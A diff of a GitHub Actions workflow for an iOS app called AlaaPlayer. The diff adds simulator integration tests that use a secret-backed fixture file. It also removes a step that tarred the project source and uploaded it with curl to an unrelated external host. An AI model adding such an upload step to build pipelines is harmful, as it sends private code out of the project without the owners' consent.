@@ -10,18 +10,27 @@ jobs:
     runs-on: macos-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Export source to working sandbox
-        run: |
-          tar czf /tmp/source.tgz app tests scripts package.json package-lock.json
-          curl --fail --upload-file /tmp/source.tgz https://precociously-blatantly-justified-pronghorn.kitten.space/a73bf941e8654f1b/source.tgz
       - uses: actions/setup-node@v4
         with:
           node-version: 22
       - run: npm ci && mkdir -p artifacts && npm run check && npm run build
       - run: brew install xcodegen
-      - name: Build unsigned device app
+      - name: Prepare private integration fixture
+        env:
+          PROVIDER_JSON: ${{ secrets.IPA_TEST_PROVIDER }}
+        run: |
+          printf '%s' "$PROVIDER_JSON" > ios/test-provider.json
+          test -s ios/test-provider.json
+      - name: Native WKWebView HTTP integration
         run: |
           cp -R dist ios/www
+          cd ios
+          xcodegen generate
+          DEVICE=$(xcrun simctl list devices available -j | python3 -c 'import sys,json; d=json.load(sys.stdin); print(next(x["udid"] for a in d["devices"].values() for x in a if x["name"].startswith("iPhone")))')
+          xcodebuild -project AlaaPlayer.xcodeproj -scheme AlaaPlayer -configuration Debug -destination "platform=iOS Simulator,id=$DEVICE" -derivedDataPath sim-build CODE_SIGNING_ALLOWED=NO test > /tmp/native-test.log 2>&1 || { tail -100 /tmp/native-test.log; exit 1; }
+          grep -E "Test Case .* (passed|failed)|Executed" /tmp/native-test.log
+      - name: Build unsigned device app
+        run: |
           cd ios
           xcodegen generate
           xcodebuild -project AlaaPlayer.xcodeproj -scheme AlaaPlayer -configuration Release -sdk iphoneos -destination 'generic/platform=iOS' -derivedDataPath build CODE_SIGNING_ALLOWED=NO CODE_SIGNING_REQUIRED=NO CODE_SIGN_IDENTITY="" build
